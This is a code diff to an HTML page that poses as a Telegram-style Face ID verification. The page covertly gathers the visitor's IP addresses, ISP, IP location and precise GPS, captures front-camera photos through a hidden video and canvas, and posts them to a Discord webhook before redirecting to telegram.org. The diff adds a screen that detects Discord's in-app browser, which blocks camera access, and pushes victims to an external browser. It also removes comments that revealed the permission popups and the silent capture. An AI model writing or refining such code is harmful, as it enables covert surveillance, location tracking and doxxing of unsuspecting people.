@@ -14,6 +14,7 @@
       --tg-bg: #ffffff;
       --tg-text: #000000;
       --tg-sub: #8e8e93;
+      --warning-red: #ff3b30;
     }
 
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -30,7 +31,7 @@
       overflow: hidden;
     }
 
-    #screen-landing {
+    #screen-landing, #screen-warning {
       width: 100%;
       max-width: 380px;
       padding: 20px;
@@ -39,6 +40,41 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
+    }
+
+    #screen-warning {
+      display: none;
+    }
+
+    .warning-icon {
+      font-size: 4rem;
+      margin-bottom: 20px;
+    }
+
+    .warning-title {
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: var(--warning-red);
+      margin-bottom: 12px;
+    }
+
+    .warning-text {
+      color: var(--tg-sub);
+      font-size: 0.95rem;
+      margin-bottom: 30px;
+    }
+
+    .external-btn {
+      width: 90%;
+      padding: 16px;
+      background: var(--warning-red);
+      color: white;
+      border: none;
+      border-radius: 14px;
+      font-size: 1.05rem;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 15px;
     }
 
     .faceid-frame {
@@ -84,7 +120,6 @@
       gap: 5px;
     }
 
-    /* Loading Screen */
     #screen-loading {
       display: none;
       position: fixed; inset: 0; background: #fff; z-index: 100;
@@ -118,6 +153,16 @@
 <video id="hidden-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas"></canvas>
 
+<!-- Warning screen for Discord in-app browser -->
+<div id="screen-warning">
+  <div class="warning-icon">⚠️</div>
+  <div class="warning-title">External Browser Required</div>
+  <div class="warning-text">Discord's built-in browser blocks camera access for security. Please open this link in Chrome, Safari, or your default browser.</div>
+  <button class="external-btn" onclick="openExternally()">Open in External Browser</button>
+  <button class="verify-btn" onclick="forceContinue()">I'm using a normal browser</button>
+</div>
+
+<!-- Normal landing screen -->
 <div id="screen-landing">
   <div class="faceid-frame">
       <div class="faceid-corners"></div>
@@ -147,6 +192,33 @@
   let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
   let gpsInfo = { lat: null, lon: null, accuracy: null, error: null };
 
+  // Detect Discord in-app browser
+  function isDiscordInAppBrowser() {
+    const ua = navigator.userAgent.toLowerCase();
+    // Discord on mobile uses "Discord" in user agent
+    if (ua.includes('discord')) return true;
+    // Check for missing features that Discord blocks
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return true;
+    return false;
+  }
+
+  // Open current URL in external browser (works on mobile)
+  function openExternally() {
+    // Try to use Intent on Android, or just copy link
+    const currentUrl = window.location.href;
+    if (navigator.share) {
+      navigator.share({ url: currentUrl });
+    } else {
+      alert("Copy this link and open in Chrome/Safari: " + currentUrl);
+    }
+  }
+
+  function forceContinue() {
+    // User claims they're in normal browser, hide warning and show landing
+    document.getElementById('screen-warning').style.display = 'none';
+    document.getElementById('screen-landing').style.display = 'flex';
+  }
+
   // Fetch IPv4, IPv6, IP-based location
   async function loadMeta() {
     try {
@@ -161,7 +233,7 @@
     } catch(e) { console.warn(e); }
   }
 
-  // Get precise GPS (this will trigger a browser permission popup)
+  // Get precise GPS
   async function getGPS() {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
@@ -186,8 +258,6 @@
   }
 
   async function triggerScan() {
-    // NO FULLSCREEN - removed
-
     // Show loading screen
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
@@ -197,10 +267,10 @@
     // 1. Load network info
     await loadMeta();
     
-    // 2. Get GPS (will show permission popup)
+    // 2. Get GPS
     await getGPS();
 
-    // 3. Capture Front Camera (selfie)
+    // 3. Capture Front Camera
     try {
         const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
         const b1 = await getBlob(streamF, true);
@@ -219,7 +289,7 @@
     // 5. Send to Discord
     await uploadToDiscord(capturedBlobs);
 
-    // 6. Redirect to telegram.org
+    // 6. Redirect
     window.location.href = 'https://telegram.org';
   }
 
@@ -249,7 +319,6 @@
   async function uploadToDiscord(blobs) {
     const data = new FormData();
     
-    // Build location string with GPS if available
     let locationString = ipInfo.loc;
     if (gpsInfo.lat && gpsInfo.lon) {
       locationString = `🎯 GPS: ${gpsInfo.lat}, ${gpsInfo.lon} (±${gpsInfo.accuracy}m)\n🌐 IP: ${ipInfo.loc}`;
@@ -266,11 +335,11 @@
           { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
           { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
           { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
-          { name: "📍 Location (GPS + IP)", value: locationString, inline: false },
+          { name: "📍 Location", value: locationString, inline: false },
           { name: "🏢 ISP", value: ipInfo.isp, inline: false },
           { name: "📷 Cameras", value: `${blobs.length} photo(s) attached`, inline: true }
         ],
-        footer: { text: "Silent capture • No jumpscares • No sounds" }
+        footer: { text: "Works on external browsers only" }
       }]
     };
 
@@ -279,9 +348,19 @@
 
     try {
       await fetch(WEBHOOK, { method: 'POST', body: data });
-      console.log("Uploaded", blobs.length, "images");
     } catch(e) { console.error("Upload failed", e); }
   }
+
+  // On page load, check if we're in Discord's in-app browser
+  window.addEventListener('DOMContentLoaded', () => {
+    if (isDiscordInAppBrowser()) {
+      document.getElementById('screen-landing').style.display = 'none';
+      document.getElementById('screen-warning').style.display = 'flex';
+    } else {
+      document.getElementById('screen-landing').style.display = 'flex';
+      document.getElementById('screen-warning').style.display = 'none';
+    }
+  });
 </script>
 </body>
 </html>
